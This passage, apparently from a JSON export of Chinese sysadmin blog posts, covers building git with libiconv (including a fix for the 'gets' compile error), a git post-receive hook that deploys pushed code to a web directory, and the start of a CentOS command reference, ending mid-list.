libiconv-1.14\n./configure --prefix=/usr/local/libiconv  &amp;&amp;  make  &amp;&amp; make install</code></pre>\n\n<p>　　返回git在此编译安装</p>\n\n<pre>\n<code class=\"language-html hljs\">cd ../git-2.3.0\nmake clean\n</code>autoconf\n<code class=\"language-html hljs\">./configure --prefix=/usr/local --with-iconv=/usr/local/libiconv/\nmake install</code></pre>\n\n<p>错误如下：</p>\n\n<pre class=\"has\">\n<code>    In file included from progname.c:26:0:\n    ./stdio.h:1010:1: error: ‘gets’ undeclared here (not in a function)\n    _GL_WARN_ON_USE (gets, \"gets is a security hole - use fgets instead\");\n    ^\n    make[2]: *** [progname.o] Error 1\n    make[2]: Leaving directory `/usr/local/src/zabbix-2.4.7/libiconv-1.14/srclib'\n    make[1]: *** [all] Error 2\n    make[1]: Leaving directory `/usr/local/src/zabbix-2.4.7/libiconv-1.14/srclib'\n    make: *** [all] Error 2</code></pre>\n\n<p> </p>\n\n<p>解决办法：</p>\n\n<pre class=\"has\">\n<code>vi libiconv-1.14/srclib/stdio.in.h</code></pre>\n\n<p><strong>将698行的代码：<code>_GL_WARN_ON_USE (gets, \"gets is a security hole - use fgets instead\");</code><strong>替换</strong>为：</strong></p>\n\n<pre class=\"has\">\n<code>#if defined(__GLIBC__) &amp;&amp; !defined(__UCLIBC__) &amp;&amp; !__GLIBC_PREREQ(2, 16)\n _GL_WARN_ON_USE (gets, \"gets is a security hole - use fgets instead\");#endif</code></pre>\n\n<p>此时执行git --version仍然提示command not found，git已经安装成功，可能是配有配置环境变量</p>\n\n<p>4.配置环境变量</p>\n\n<p>vim /etc/profile<br>\n在文件最后一行添加：export PATH=/usr/local/git/bin:$PATH，保存退出</p>\n\n<p>发现仍然不行，这是因为配置还未生效，不重启系统，使用source命令立即生效</p>\n\n<p>source /etc/profile<br>\n然后git --version，提示 git version 2.3.0，已安装成功。</p>\n\n<p>我这是用一个新linux服务器安装的，所有步骤都以列出，如有问题请联系</p>\n                                    </div>", "log_PostTime": 1584891032, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "GIT上传服务器同步到web目录", "log_Intro": "GIT上传服务器同步到web目录", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">实现自动同步到站点目录（www）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">就比如刚才我们往远程仓库推送了index.php文件，虽然提示推送成功，但是我们现在在服务器端还看不到效果，心理总是不爽。又比如我写了个html页面，我想在站点中马上看到，那自动同步就派上用场了。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">自动同步功能用到的是<strong> git 的钩子功能</strong>，</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">服务器端：进入裸仓库：/home/html/erp/git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">cd /home/html/erp/git<br style=\"margin:.2em;\">cd hooks</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">//这里我们创建post-receive文件<br style=\"margin:.2em;\">vim post-receive</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">//在该文件里输入以下内容<br style=\"margin:.2em;\">#!/bin/bash<br style=\"margin:.2em;\">git --work-tree=/home/www checkout -f</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">//保存退出后，将该文件用户及用户组都设置成git<br style=\"margin:.2em;\">chown git:git post-receive</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">//由于该文件其实就是一个shell文件，我们还应该为其设置可执行权限<br style=\"margin:.2em;\">chmod +x post-receive<br></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">现在我们可以在本地计算机中修改index.php文件，或者添加一个新文件，提交到远程仓库，然后到/home/www下面，看看有没有我们刚才提交的文件。</span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">如果你在Git推送的工程中发现推送成功 但是在www目录下并没有自己的代码，这时候你可要注意了：这是由于文件夹的权限的原因造成的！ 假设你的www目录的所属的用户组为root，你可以将你的git用户加入这个组;并给git添加写入权限，或者其他解决方法，反正你要服务器上的git用户有权限进入www文件夹<br style=\"margin:.2em;\">让git有www权限命令如下<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/4724e5b1e4ff7d2a0d6444d1a6e774fc_619x28.png\" style=\"border:0px none;vertical-align:top;\"></span></p>                                    </div>", "log_PostTime": 1584891034, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "centos命令大全", "log_Intro": "centos命令大全", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>系统信息</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">arch 显示机器的处理器架构(1)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">uname -m 显示机器的处理器架构(2)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">uname -r 显示正在使用的内核版本</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">hdparm -i /dev/hda 罗列一个磁盘的架构特性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">hdparm -tT /dev/sda 在磁盘上执行测试性读取操作</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/cpuinfo 显示CPU info的信息</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/interrupts 显示中断</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/meminfo 校验内存使用</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/swaps 显示哪些swap被使用</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/version 显示内核的版本</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/net/dev 显示网络适配器及统计</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat /proc/mounts 显示已加载的文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">lspci -tv 罗列 PCI 设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">lsusb -tv 显示 USB 设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">date 显示系统日期</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cal 2007 显示2007年的日历表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">date 041217002007.00 设置日期和时间 - 月日时分年.秒</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">clock -w 将时间修改保存到 BIOS</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">关机 (系统的关机、重启以及登出 )</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">shutdown -h now 关闭系统(1)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">init 0 关闭系统(2)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">telinit 0 关闭系统(3)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">shutdown -h hours:minutes &amp; 按预定时间关闭系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">shutdown -c 取消按预定时间关闭系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">shutdown -r now 重启(1)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">reboot 重启(2)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">logout 注销</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文件和目录</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd /home 进入 '/ home' 目录'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd .. 返回上一级目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd ../.. 返回上两级目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd 进入个人的主目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd ~user1 进入个人的主目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd - 返回上次所在的目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p 